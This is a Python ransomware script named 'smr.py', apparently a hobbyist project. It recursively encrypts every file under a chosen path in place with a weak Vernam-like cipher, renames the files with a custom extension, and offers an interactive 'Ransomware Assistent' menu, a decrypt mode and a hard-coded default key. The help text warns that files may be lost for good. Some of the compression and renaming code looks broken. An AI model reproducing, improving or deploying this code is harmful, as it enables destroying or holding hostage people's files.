import os
import sys
import base64
import time
import lzma

def getListOfFiles(dirName):
    listOfFile = os.listdir(dirName)
    allFiles = list()
    for entry in listOfFile:
        fullPath = os.path.join(dirName, entry)
        if os.path.isdir(fullPath):
            allFiles = allFiles + getListOfFiles(fullPath)
        else:
            allFiles.append(fullPath)                
    return allFiles

#def reorder(string, password, mode):
    

def vernam(string, password, mode):
    if len(password) < len(string):
        if verbose:
            print(f"[{str(int(round(time.time() * 1000)))[6:]}] Increasing password size to match open file size...")
        while len(password) < len(string):
            password = base64.b64encode(password.encode("ascii")).decode("ascii")
    i = 0
    aux = ""
    aux2 = []
    strLen = len(string) 
    while i < strLen:
        if mode == "b":
            passw = int(str(ord(password[i])))
            if int(string[i]) < passw:
                string[i] = int(string[i]) + 127
            aux2.append(chr((int(string[i])) - passw))

        else:
            try:
                aux += str(((int(str(ord(string[i]))) + int(str(ord(password[i]))))%127))
                aux += "+"
            except Exception as err:
                print(f"Error: {err}")

        i += 1
    if mode == "b":
        aux2 = "".join(aux2)
        return bytearray.fromhex(aux2)
    else:
        if verbose:
            print(f"[{str(int(round(time.time() * 1000)))[6:]}] Size of encrypted file: {len(aux)/1024} kilobytes")

            if compression:
                 print("Encoding and compress...")
                 aux = (aux[:-1]).encode("utf-8")
                 obj = lzma.LZMAFile(mode, "wb")
                 print("Writing to file")
                 obj.write(aux)
                 obj.close()
                 return 0
        return aux[:-1]

def ransom(passw, ext, path):
    startingEncryptionTime = f"{str(int(round(time.time() * 1000)))[7:]}"
    print(f"\n[{str(int(round(time.time() * 1000)))[6:]}] Starting to encrypt files...")
    files = getListOfFiles(path)
    if verbose:                                                    print(f"[{str(int(round(time.time() * 1000)))[6:]}] List of files: {' '.join(files)}\n")
    thisFile = f"{path}{__file__}"
    i = 0;
    while i < len(files):
        if files[i] != thisFile:
            print(f"[{str(int(round(time.time() * 1000)))[6:]}] Encrypting file {files[i]}...")
            f = open(files[i], "r+b")
            fContent = f.read()
            if verbose:                                                    print(f"[{str(int(round(time.time() * 1000)))[6:]}] Size of file: {len(fContent)/1024}  kilobytes")
            fContent = fContent.hex()
            if os.path.splitext(files[i])[1]:
                if os.path.splitext(files[i])[1] != f".{ext}":
                    os.rename(f"{files[i][2:]}", f"{files[i][2:]}.{ext}")
                    if verbose:
                        print(f"[{str(int(round(time.time() * 1000)))[6:]}] Rename {files[i][2:]} to {files[i][2:]}.{ext}")

            if not os.path.splitext(files[i])[1]:
                if not os.path.exists(f"{files[i][2:]}.{ext}"):
                    os.rename(f"{files[i][2:]}", f"{files[i][2:]}.{ext}")
            f.close()
            try:
                f = open(files[i], "r+")
                route = files[i]
            except Exception as err:
                f = open(f"{files[i]}.{ext}", "r+")
                route = f"{files[i]}.{ext}"
            f.seek(0)
            f.truncate()
            if verbose:
                print(f"[{str(int(round(time.time() * 1000)))[6:]}] Starting encryption...")
            if compression:
                vernam(fContent, passw, route) 
            else:
                f.write("".join(vernam(fContent, passw, "f")))
            print(f"[{str(int(round(time.time() * 1000)))[6:]}] File \"{files[i]}\" encrypted in {((int(str(int(round(time.time() * 1000)))[7:]))) - int(startingEncryptionTime)} milliseconds.\n")
            f.close()
        i += 1

# I want to separate logic in functions to simplify understanding.
def dransom(passw, ext, path):
    startingDecryptionTime = f"{str(int(round(time.time() * 1000)))[7:]}"
    print(f"\n[{str(int(round(time.time() * 1000)))[6:]}] Starting to decrypt files...")
    files = getListOfFiles(path)
    thisFile = f"{path}{__file__}"

    i = 0;
    while i < len(files):
        if files[i] != thisFile:
            if os.path.splitext(files[i])[1]:
                if os.path.splitext(files[i])[1] == f".{ext}":
                    os.rename(f"{files[i][2:]}", f"{files[i][2:-(len(ext)+1)]}")
                    files[i] = files[i][:-(len(ext)+1)]
            print(f"[{str(int(round(time.time() * 1000)))[6:]}] Decrypting file {files[i]}...")

            if compression:
                print("Staring decompression...")
                with lzma.open(files[i]) as f:
                    fContent = f.read().decode("utf-8")
            else:
                f = open(files[i], "r+")
                fContent = f.read()
            fContent = fContent.split("+")
            if os.path.splitext(files[i])[1]:
                if os.path.splitext(files[i])[1] == f".{ext}":
                    os.rename(f"{files[i][2:]}", f"{files[i][2:-1]}")

            f.close()
            try:
                f = open(files[i], "r+b")
            except Exception as err:
                f = open(f"{files[i]}.{ext}", "r+b")
            f.seek(0)
            f.truncate()
            f.write(vernam(fContent, passw, "b"))
            print(f"[{str(int(round(time.time() * 1000)))[6:]}] File \"{files[i]}\" decrypted in {((int(str(int(round(time.time() * 1000)))[7:]))) - int(startingDecryptionTime)} milliseconds.\n")
            f.close()
        i += 1

def cli(recursion):
    passw = "1337"
    ext = "smr"
    path = "./"
    mode = "2"

    helpMenu = f"""Usage: python smr.py [-option1] [-option2] [...]
 -a,  --adition  Add/Remove file extension to/from file.
 -c,  --compression  Compress/Decompress the files to reduce end size. 
 -d,  --decrypt  Only decrypt. If a non encrypted file is in the path, will be encrypted.
 -e,  --encrypt  Only encrypt. Uses weak Symmetric-key algorithm. Similar to Vernam or Affine encryption.
 -h,  --help     Open this menu.
 -i,  --interactive  Extra help to use the ransomware.
 -k,  --key      Key/Password to encrypt files. 
 -p,  --path     Chose the path where the ransomware is goinf to run. All files in the path ans subpaths will be selected.
 -v,  --verbose  Add more output to the console. Show more information about the running tasks.

NOTICE: You can lose your files if the ranswomare crash, your pc shutdown or you can't remember your encryption key. I didn't made a bruteforce algorithm to decrypt the files. Since password is reused can be possible to recover the encrypted files. If you seriously need to, send me a message. https://twitter.com/XSStringManolo

"""

    if len(sys.argv) > 1 or recursion == "interactive":
        i = 1
        if recursion == "interactive":
            i = 0
        while i < len(sys.argv):
            if sys.argv[i] == '--verbose' or sys.argv[i] == '-v':
                global verbose
                verbose = True

            if sys.argv[i] == '-e' or sys.argv[i] == '--encrypt':
                mode = 0

            if sys.argv[i] == '-d' or sys.argv[i] == '--decrypt':
                mode = 1
                    
            if sys.argv[i] == '-p' or sys.argv[i] == '--path':
                path = sys.argv[i+1]
                i += 1

            if sys.argv[i] == '-k' or sys.argv[i] == '--key':
                passw = sys.argv[i+1]
                i += 1

            if sys.argv[i] == '-a' or sys.argv[i] == '--adition':
                ext = sys.argv[i+1]
                i += 1

            if sys.argv[i] == '-c' or sys.argv[i] == '--compression':
                global compression
                compression = True

            if sys.argv[i] == '--interactive' or sys.argv[i] == '-i':
                mode = input(f"""Ransomware Assistent:
Write the number matching the option:
0 - Encrypt files.
1 - Decrypt files.
2 - Encrypt & Decrypt files. (only for debug)
€ """)
                ext = input(f"""Chose a string to append to encrypted files as extension.
Example: helloWorld.html -> helloWorld.html.jaja
To follow the example you ONLY write jaja
Your extension name:
€ """)
                path = input(f"""Chose a path to encrypt all files. The subdirectories also get encrypted.
To encrypt current folder and subfolder from where you are running the ransomware use write ./
€ """)
                passw = input(f"""Chose the password to encrypt the files. Can be any size. 
Example: abc123
€ """)
            elif sys.argv[i] == "--help" or sys.argv[i] == "-h":
                print(helpMenu)
                return 0
            elif i == 0:
                "first argument. Don't to go else"
#            else:
#                print(f"""Help menu: """)
#                return 0
            i += 1

    if mode == "0" or mode == 0:
        ransom(passw, ext, path)
    elif mode == "1" or mode == 1:
        dransom(passw, ext, path)
    elif mode == "2" or mode == 2:
        ransom(passw, ext, path)
        dransom(passw, ext, path)
    else:
        print(f"Chose a valid mode. {mode} not valid")
        cli("interactive")

global verbose
verbose = False
global compression
compression = False
if len(sys.argv) == 1:
    cli("interactive")
else:
    cli("default")

